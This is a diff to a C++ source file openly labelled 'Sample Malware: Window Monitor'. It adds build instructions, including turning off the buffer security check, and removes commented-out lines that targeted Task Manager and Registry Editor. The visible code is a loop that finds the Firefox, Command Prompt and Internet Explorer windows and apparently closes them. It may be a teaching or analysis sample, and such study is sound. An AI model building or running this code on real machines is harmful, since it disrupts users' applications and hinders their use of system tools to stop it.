@@ -1,3 +1,27 @@
+/*-------------------------------------------------------------------------------------------------
+ *
+ *      Sample Malware: Window Monitor
+ *      Function      : Monitor and close given windows
+ * 
+ *-----------------------------------------------------------------------------------------------
+ *
+ *        Best built in Visual Studio 10
+ *          Porject settings (Configuration Properties):
+ * 
+ *              1. C/C++ --> Advanced --> Calling convention
+ *                 Set __stdcall (Gz)
+ * 
+ *              2. C/C++ --> Code Generation --> Buffer Security Check
+ *                 Set NO
+ * 
+ *              3. Linker --> General --> Enable Incremental Linking
+ *                 Set NO
+ * 
+ *              4. Linker --> System --> SubSystem
+ *                 Set CONSOLE
+ *
+ *-----------------------------------------------------------------------------------------------*/
+
 #pragma runtime_checks( "[runtime_checks]", off )
  
 #include <iostream>
@@ -20,10 +44,8 @@ int main(){
 DWORD WINAPI DestroyWindows(LPVOID){
       while(1)
       {
-            //   TaskMgr = FindWindow(NULL,"Task Manger");  // Needs admin privilege
               notepad = FindWindow("MozillaWindowClass",NULL);
               CMD = FindWindow(NULL, "Command Prompt");
-            //   Regedit = FindWindow(NULL,"Registry Editor");  // Needs admin privilege
               ie = FindWindow(NULL,"Internet Explorer");
               if( notepad != NULL )
               {
